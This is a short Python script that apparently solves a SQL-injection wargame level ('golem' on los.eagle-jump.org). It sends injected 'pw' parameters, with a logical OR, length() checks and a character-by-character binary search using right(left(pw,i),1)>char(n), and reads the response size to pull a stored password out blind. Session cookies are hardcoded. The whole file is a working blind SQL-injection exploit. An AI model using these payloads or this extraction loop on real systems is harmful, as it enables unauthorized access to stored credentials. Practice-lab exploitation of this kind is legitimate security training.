import requests
import time


def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=' || id like 'guest' %26%26 length(pw)<"+str(length)+" --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(esult.text.find("Hello"))
		if(result.text.find("Hello")<2500):
			print("Length is : "+str(length-1))
			return length-1


def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add=query+"?pw=' || id like 'guest' %26%26 right(left(pw,"+str(index)+"),1)>char("+str(mid)+") --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(first, last, result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			first=mid+1
			if(last==first+1):
				query_add=query+"?pw=' || id like 'guest' %26%26 right(left(pw,"+str(index)+"),1)>char("+str(first)+") --%20"
				result=requests.get(query_add, cookies=cookie)
				if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
					return last
				else:
					return first
		else:
			last=mid

	return first


if(__name__=="__main__"):
	
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"9j8g44sjmu6jf7uj11dh7mdue4"}
	query='https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php'
	#password(1)
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)), end="")
	